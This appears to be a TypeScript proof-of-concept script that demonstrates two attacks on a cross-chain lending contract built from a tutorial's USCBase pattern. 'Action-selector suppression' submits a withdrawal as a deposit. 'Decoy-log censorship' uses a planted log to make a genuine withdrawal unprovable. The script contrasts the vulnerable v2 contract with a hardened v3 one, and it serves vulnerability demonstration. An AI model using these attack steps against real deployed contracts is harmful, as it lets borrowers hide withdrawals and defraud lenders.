import dotenv from 'dotenv';
import { Contract, ethers, InterfaceAbi } from 'ethers';
import { chainInfo, proofProvider } from '@gluwa/usc-sdk';

import v2Abi from '../abi/DeadswitchManager.json';
import v3Abi from '../abi/DeadswitchManagerV3.json';
import { CORE, requireEnv } from './env';

dotenv.config({ override: true });

requireEnv([...CORE, 'DEADSWITCH_MANAGER_ADDRESS', 'DEADSWITCH_MANAGER_V3_ADDRESS', 'COLLATERAL_VAULT_ADDRESS']);

/**
 * Demonstrates the two structural flaws in the tutorial's USCBase pattern, live.
 *
 *   yarn attack suppression <tx> <positionId>
 *   yarn attack decoy       <tx> <positionId>
 *
 * For each: submit the proven source transaction to the v2 manager (which inherits
 * the tutorial's USCBase) and to the hardened v3 manager, and show what each does.
 */
async function main() {
  const [mode, txHash, positionId] = process.argv.slice(2);
  if (!['suppression', 'decoy'].includes(mode) || !txHash || !positionId) {
    console.error('Usage: yarn attack <suppression|decoy> <source_tx_hash> <positionId>');
    process.exit(1);
  }

  const chainKey = Number(process.env.SOURCE_CHAIN_KEY);
  const cc = new ethers.JsonRpcProvider(process.env.CREDITCOIN_RPC_URL);
  const src = new ethers.JsonRpcProvider(process.env.SOURCE_CHAIN_RPC_URL);
  const wallet = new ethers.Wallet(process.env.CREDITCOIN_WALLET_PRIVATE_KEY!, cc);

  const tx = await src.getTransaction(txHash);
  if (!tx?.blockNumber) throw new Error('source tx not mined');
  const receipt = await src.getTransactionReceipt(txHash);

  console.log(`\n${'='.repeat(74)}`);
  console.log(mode === 'suppression'
    ? 'ATTACK A — action-selector suppression'
    : 'ATTACK B — decoy-log censorship');
  console.log('='.repeat(74));
  console.log(`Source tx ${txHash}`);
  console.log(`Sepolia block ${tx.blockNumber}, ${receipt!.logs.length} logs in one transaction:`);
  for (const [i, l] of receipt!.logs.entries()) {
    const from = l.address.toLowerCase();
    const tag =
      from === process.env.COLLATERAL_VAULT_ADDRESS!.toLowerCase() ? 'REAL VAULT'
      : from === process.env.DECOY_VAULT_ADDRESS?.toLowerCase() ? 'DECOY CONTRACT'
      : 'token';
    console.log(`  [${i}] ${l.address}  (${tag})`);
  }
  console.log();

  const pb = new proofProvider.service.ProofBuilder(chainKey, process.env.PROOF_BUILDER_URL!);
  const info = new chainInfo.PrecompileChainInfoProvider(cc);
  await info.getLatestAttestedHeightAndHash(chainKey);
  console.log('Waiting for attestation…');
  await pb.waitUntilHeightAttested(chainKey, tx.blockNumber, 15_000, 1_200_000);
  const r = await pb.getProof(txHash);
  if (!r.success) throw new Error(`proof failed: ${r.error}`);
  const p = r.data!;
  console.log('Proof generated — the transaction is provably on-chain.\n');

  const v2 = new Contract(process.env.DEADSWITCH_MANAGER_ADDRESS!, v2Abi as InterfaceAbi, wallet);
  const v3 = new Contract(process.env.DEADSWITCH_MANAGER_V3_ADDRESS!, v3Abi as InterfaceAbi, wallet);
  const args = [p.chainKey, p.headerNumber, p.txBytes, p.merkleProof.root,
    p.merkleProof.siblings, p.continuityProof.lowerEndpointDigest, p.continuityProof.roots];

  // ---- v2: inherits the tutorial's USCBase ----
  console.log('--- v2 manager (tutorial USCBase: caller-supplied action, logs[0] only) ---');
  if (mode === 'suppression') {
    console.log('Attacker submits the transaction as action=1 (DEPOSIT), hiding the withdrawal.');
    try {
      await (await v2.execute(1, ...args, { gasLimit: 2_000_000 })).wait();
      const pos = await v2.debtPositions(positionId);
      console.log(`  accepted. attested collateral = ${ethers.formatEther(pos.lastAttestedCollateral)}, status = ${pos.status === 0n ? 'ACTIVE' : 'LIQUIDATED'}`);
    } catch (e: any) { console.log('  reverted:', e.shortMessage ?? e.message); }

    console.log('Anyone now tries to submit the SAME transaction as action=0 (WITHDRAWAL):');
    try {
      await v2.execute.staticCall(0, ...args);
      console.log('  accepted — attack failed.');
    } catch (e: any) {
      console.log(`  REVERTED: "${e.reason ?? e.shortMessage}"`);
      console.log('  The withdrawal is permanently unprovable. Collateral gone, position alive.');
    }
  } else {
    console.log('Submitting the genuine withdrawal (decoy log sits at logs[0]):');
    try {
      await v2.execute.staticCall(0, ...args);
      console.log('  accepted — attack failed.');
    } catch (e: any) {
      console.log(`  REVERTED: "${e.reason ?? e.shortMessage}"`);
      console.log('  The emitter guard rejects the whole transaction because of a log it does');
      console.log('  not own. The genuine withdrawal is permanently unprovable.');
    }
  }

  // ---- v3: hardened ----
  console.log('\n--- v3 manager (action derived from logs, all vault logs applied) ---');
  try {
    const t = await v3.execute(...args, { gasLimit: 3_000_000 });
    const rec = await t.wait();
    for (const l of rec!.logs) {
      try {
        const parsed = v3.interface.parseLog(l);
        if (parsed?.name === 'PositionLiquidated') {
          console.log(`  PositionLiquidated(#${parsed.args[0]}): ${ethers.formatEther(parsed.args[1])} < ${ethers.formatEther(parsed.args[2])}`);
        } else if (parsed?.name === 'CollateralAttested') {
          console.log(`  CollateralAttested(#${parsed.args[0]}): remaining ${ethers.formatEther(parsed.args[1])}`);
        }
      } catch { /* not ours */ }
    }
    const pos = await v3.debtPositions(positionId);
    console.log(`  final status = ${pos.status === 0n ? 'ACTIVE' : pos.status === 1n ? 'LIQUIDATED' : 'CLOSED'}`);
    console.log(pos.status === 1n
      ? '  ATTACK DEFEATED — the withdrawal was seen and the position liquidated.\n'
      : '  position not liquidated — check thresholds.\n');
  } catch (e: any) {
    console.log('  reverted:', e.reason ?? e.shortMessage ?? e.message, '\n');
  }
  process.exit(0);
}

main().catch((e) => { console.error(e); process.exit(1); });
